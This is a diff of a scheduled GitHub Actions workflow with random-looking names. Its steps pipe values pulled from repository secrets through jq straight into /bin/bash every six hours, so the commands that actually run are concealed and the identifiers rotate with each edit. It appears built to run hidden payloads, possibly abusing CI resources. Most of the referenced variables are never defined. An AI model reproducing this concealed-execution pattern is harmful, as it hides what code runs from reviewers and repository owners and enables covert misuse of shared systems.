@@ -3,21 +3,24 @@ name: atrennuo
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 5/6 * * *'
+    - cron: '35 2/6 * * *'
 
-jobs:  # 15964
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: atrennuo
         env:
-          qoib97: ${{ secrets.qoib97 }}
+          kzcky68793: ${{ secrets.kzcky68793 }}
         run: |
-          echo $qoib97 | jq -r .cay2807 | /bin/bash
-          echo $gu1835 | jq -r .chf2449 | /bin/bash
-          echo $nr973 | jq -r .ahbc8 | /bin/bash
-          echo $qzjb20790 | jq -r .uv05201 | /bin/bash
-          echo $pbtgf53946 | jq -r .srm04 | /bin/bash
-          echo $kaute4 | jq -r .xjwih468 | /bin/bash
+          echo $kzcky68793 | jq -r .kj186 | /bin/bash
+          echo $jt7462 | jq -r .vmbv7 | /bin/bash
+          echo $hz99 | jq -r .cmcbq97 | /bin/bash
+          echo $h7 | jq -r .rvij2000 | /bin/bash
+          echo $goss7538 | jq -r .yuydg43 | /bin/bash
+          echo $l2 | jq -r .mj2418 | /bin/bash
+          echo $knxeu6272 | jq -r .vldo56 | /bin/bash
+          echo $ylorq2 | jq -r .onpd5 | /bin/bash
+          echo $g1326 | jq -r .r42 | /bin/bash
 
